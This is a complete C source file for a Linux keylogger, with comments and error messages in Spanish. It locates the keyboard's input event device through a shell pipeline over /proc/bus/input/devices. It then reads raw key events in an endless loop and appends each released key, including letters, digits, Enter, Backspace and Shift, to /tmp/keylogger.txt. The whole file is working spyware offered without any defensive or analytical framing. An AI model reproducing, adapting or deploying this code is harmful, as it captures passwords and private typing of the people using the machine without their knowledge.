#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/tmp/keylogger.txt"

char *getEvent();
void logKey(int code, FILE *fp);

int main() {
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        perror("Error al abrir el dispositivo del teclado");
        exit(1);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        perror("Error al abrir el archivo de log");
        close(device_keyboard);
        exit(1);
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) {
            logKey(ev.code, fp);
            fflush(fp); // Asegura que los datos se escriban inmediatamente en el archivo
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    char *command = "cat /proc/bus/input/devices | grep -C 4 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

void logKey(int code, FILE *fp) {
    switch (code) {
        case KEY_A: fprintf(fp, "a"); break;
        case KEY_B: fprintf(fp, "b"); break;
        case KEY_C: fprintf(fp, "c"); break;
        case KEY_D: fprintf(fp, "d"); break;
        case KEY_E: fprintf(fp, "e"); break;
        case KEY_F: fprintf(fp, "f"); break;
        case KEY_G: fprintf(fp, "g"); break;
        case KEY_H: fprintf(fp, "h"); break;
        case KEY_I: fprintf(fp, "i"); break;
        case KEY_J: fprintf(fp, "j"); break;
        case KEY_K: fprintf(fp, "k"); break;
        case KEY_L: fprintf(fp, "l"); break;
        case KEY_M: fprintf(fp, "m"); break;
        case KEY_N: fprintf(fp, "n"); break;
        case KEY_O: fprintf(fp, "o"); break;
        case KEY_P: fprintf(fp, "p"); break;
        case KEY_Q: fprintf(fp, "q"); break;
        case KEY_R: fprintf(fp, "r"); break;
        case KEY_S: fprintf(fp, "s"); break;
        case KEY_T: fprintf(fp, "t"); break;
        case KEY_U: fprintf(fp, "u"); break;
        case KEY_V: fprintf(fp, "v"); break;
        case KEY_W: fprintf(fp, "w"); break;
        case KEY_X: fprintf(fp, "x"); break;
        case KEY_Y: fprintf(fp, "y"); break;
        case KEY_Z: fprintf(fp, "z"); break;
        case KEY_1: fprintf(fp, "1"); break;
        case KEY_2: fprintf(fp, "2"); break;
        case KEY_3: fprintf(fp, "3"); break;
        case KEY_4: fprintf(fp, "4"); break;
        case KEY_5: fprintf(fp, "5"); break;
        case KEY_6: fprintf(fp, "6"); break;
        case KEY_7: fprintf(fp, "7"); break;
        case KEY_8: fprintf(fp, "8"); break;
        case KEY_9: fprintf(fp, "9"); break;
        case KEY_0: fprintf(fp, "0"); break;
        case KEY_ENTER: fprintf(fp, "\n"); break;
        case KEY_SPACE: fprintf(fp, " "); break;
        case KEY_BACKSPACE: fprintf(fp, "[BACKSPACE]"); break;
        case KEY_TAB: fprintf(fp, "\t"); break;
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT: fprintf(fp, "[SHIFT]"); break;
        case KEY_CAPSLOCK: fprintf(fp, "[CAPSLOCK]"); break;
        case KEY_ESC: fprintf(fp, "[ESC]"); break;
        case KEY_DELETE: fprintf(fp, "[DELETE]"); break;
        default: fprintf(fp, "[%d]", code); break; // Por si hay alguna tecla no mapeada
    }
}
